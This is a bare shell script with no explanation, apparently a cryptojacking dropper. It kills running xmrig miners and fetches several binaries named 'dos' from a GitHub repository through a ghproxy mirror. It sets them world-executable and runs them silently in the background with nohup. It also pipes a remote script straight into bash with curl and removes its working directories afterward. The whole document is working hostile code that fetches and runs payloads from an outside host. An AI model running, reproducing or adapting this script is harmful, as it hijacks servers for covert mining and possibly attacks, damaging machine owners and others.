cd /root;rm -rf c3pool;
if [ ! -x "/root/c3pool/dos64" ]; then
    killall xmrig;
    killall dos64;
    cd /root;mkdir  c3pool
    chmod 777 /root/c3pool;
    cd /root/c3pool;wget https://ghproxy.com/https://raw.githubusercontent.com/Tremblae/Tremble/main/dos64;sleep 5;chmod 777 dos64;
    nohup /root/c3pool/dos64 > /dev/null 2>&1 &
fi

if [ ! -x "/root/c3pool/dos32" ]; then
    killall xmrig;
    killall dos32;
    cd /root;mkdir  c3pool
    chmod 777 /root/c3pool;
    cd /root/c3pool;wget https://ghproxy.com/https://raw.githubusercontent.com/Tremblae/Tremble/main/dos32;sleep 5;chmod 777 dos32;
    nohup /root/c3pool/dos32 > /dev/null 2>&1 &
fi

sleep 15
cd /root;rm -rf c3pool;

if [ ! -x "/root/c3pool/xmrig" ]; then
    curl -s -L http://ghproxy.com/https://raw.githubusercontent.com/Tremblae/Tremble/main/ba.sh | bash -s
fi

if [ ! -x "/tmp/dos24" ]; then
   cd /tmp;wget https://ghproxy.com/https://raw.githubusercontent.com/Tremblae/Tremble/main/dos24;sleep 18;chmod 777 dos24;./dos24

fi

if [ ! -x "/tmp/dos26" ]; then
   cd /tmp;wget https://ghproxy.com/https://raw.githubusercontent.com/Tremblae/Tremble/main/dos26;sleep 10;chmod 777 dos26;./dos26

fi

sleep 60;cd /root;rm -rf c3pool;
cd /tmp;rm -rf xmrig.tar.gz;
